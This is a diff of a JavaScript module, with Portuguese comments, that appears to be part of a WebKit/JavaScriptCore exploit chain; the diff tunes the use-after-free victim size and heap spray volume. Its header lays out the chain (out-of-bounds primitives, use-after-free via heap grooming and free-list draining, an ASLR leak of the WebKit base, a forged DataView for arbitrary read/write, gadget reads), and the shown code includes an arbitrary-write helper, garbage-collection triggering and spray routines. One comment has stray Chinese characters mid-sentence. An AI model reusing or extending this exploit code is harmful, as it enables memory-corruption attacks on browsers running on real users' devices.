@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v06 - Correção de Constante e Reteste UAF)
+// js/script3/testArrayBufferVictimCrash.mjs (v07 - Teste de Tamanho de Vítima Alternativo)
 // =======================================================================================
 // ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
@@ -6,7 +6,7 @@
 //    - Estratégia de Spray de objetos do MESMO TIPO da vítima (Float64Array para Float64Array).
 //    - Drenagem ativa da free list.
 //    - Múltiplas tentativas de UAF.
-//    - CORRIGIDO: ReferenceError para LOCAL_SHORT_SHORT_PAUSE.
+//    - NOVO: Teste com VICTIM_SIZE_BYTES = 0x70 (112 bytes).
 // 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
 // 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
 // 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
@@ -29,19 +29,18 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v06 - Correção de Constante e Reteste UAF";
+export const FNAME_MODULE = "v07 - Teste de Tamanho de Vítima Alternativo";
 
-// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
+// Aumentando as pausas para maior稳定性 em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
-const LOCAL_SHORT_SHORT_PAUSE = 50; // Corrigido: Nova constante de pausa para uso na drenagem de free list.
+const LOCAL_SHORT_SHORT_PAUSE = 50;
 
-let global_spray_objects = []; // Usado para o spray inicial de heap grooming de alto volume
-let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente (vítimas, sprays UAF, etc.)
+let global_spray_objects = [];
+let hold_objects = [];
 
-// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
 let _fake_data_view = null;
 
 
@@ -136,7 +135,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     } finally {
         await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
-    return value; // Retorna o valor escrito para consistência
+    return value;
 }
 
 // Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
@@ -240,14 +239,14 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 async function triggerGC(logFn, pauseFn) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     try {
-        for (let i = 0; i < 500; i++) { // Aloca 128MB de ArrayBuffer temporário
+        for (let i = 0; i < 500; i++) {
             new ArrayBuffer(1024 * 256);
         }
     } catch (e) {
         logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
-    for (let i = 0; i < 25; i++) { // Aloca 25KB adicionais
+    for (let i = 0; i < 25; i++) {
         new ArrayBuffer(1024);
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
@@ -262,11 +261,12 @@ async function triggerGC(logFn, pauseFn) {
  */
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     let dangling_ref_local = null;
-    const VICTIM_SIZE_BYTES = 0x80; // Tamanho do objeto vítima para UAF (128 bytes)
-    const SPRAY_COUNT_UAF_OPT = 2000; // Número de objetos no spray UAF
-    const SPRAY_OBJECT_DATA_LENGTH = VICTIM_SIZE_BYTES / 8; // Número de doubles para Float64Array (16 doubles para 128 bytes)
+    // TESTANDO NOVO TAMANHO DE VÍTIMA: 0x70 (112 bytes)
+    const VICTIM_SIZE_BYTES = 0x70; // Antigo: 0x80 (128 bytes)
+    const SPRAY_COUNT_UAF_OPT = 2000;
+    const SPRAY_OBJECT_DATA_LENGTH = VICTIM_SIZE_BYTES / 8; // Doubles: 14 para 0x70 bytes
 
-    logFn(`[UAF] Iniciando spray e criação de ponteiro pendurado (v05 - spray de mesmo tipo e drenagem)...`, "info");
+    logFn(`[UAF] Iniciando spray e criação de ponteiro pendurado (v07 - Testando VICTIM_SIZE_BYTES=${toHex(VICTIM_SIZE_BYTES)})...`, "info");
 
     // FASE 1: Heap Grooming (Preparação do Heap)
     const HEAP_GROOMING_SPRAY_COUNT = 15000;
@@ -311,10 +311,9 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
     await triggerGC(logFn, pauseFn);
     logFn("    Grooming spray inicial liberado e GC forçado novamente.", "info");
-    await pauseFn(LOCAL_SHORT_SHORT_PAUSE); // Pausa menor aqui para o próximo passo. 
+    await pauseFn(LOCAL_SHORT_SHORT_PAUSE);
 
-    // NOVO: Drenagem Ativa da Free List (Hypothesis)
-    // Tenta alocar e liberar pequenos grupos de objetos do mesmo tamanho da vítima.
+    // Drenagem Ativa da Free List (Hypothesis)
     const DRAIN_COUNT = 50;
     const DRAIN_SPRAY_PER_ITERATION = 50;
     logFn(`[UAF] FASE 2.5: Drenagem Ativa da Free List (${DRAIN_COUNT} iterações, ${DRAIN_SPRAY_PER_ITERATION} objetos/iteração)...`, "subtest");
@@ -323,7 +322,6 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
         for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
             drain_objects.push(new Float64Array(SPRAY_OBJECT_DATA_LENGTH)); // Aloca Float64Array do mesmo tamanho da vítima
         }
-        // Não adicione drain_objects a hold_objects; eles serão liberados implicitamente.
         if (d % 10 === 0) {
              await triggerGC(logFn, pauseFn);
         }
@@ -395,7 +393,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
         const sprayStartTime = performance.now();
-        const INITIAL_SPRAY_COUNT = 10000;
+        const INITIAL_SPRAY_COUNT = 250000;
         logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
             const dataSize = 50 + (i % 50) * 16;
